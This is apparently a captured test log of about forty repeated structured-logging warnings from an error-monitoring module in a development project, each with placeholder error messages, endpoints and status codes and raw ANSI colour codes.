WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.829772Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2658'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.829825Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2659'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.829875Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2660'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.829928Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2661'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.829977Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2662'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.830026Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2663'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.830077Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2664'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.830125Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2665'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.830237Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2666'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.830303Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2667'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.830357Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2668'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.830409Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2669'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.830463Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2670'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.830512Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2671'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.830560Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2672'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.830608Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2673'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.830657Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2674'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.830706Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2675'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.830755Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2676'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.830803Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2677'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.830850Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2678'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.830898Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2679'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.830946Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2680'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.830994Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2681'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.831043Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2682'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.831091Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2683'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.831140Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2684'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.831224Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2685'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.831781Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2686'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.831858Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2687'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.831913Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2688'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.831981Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2689'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.832075Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2690'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.832137Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2691'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.832194Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2692'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.832245Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2693'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.832295Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2694'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.832345Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2695'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.832395Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2696'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.832444Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2697'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
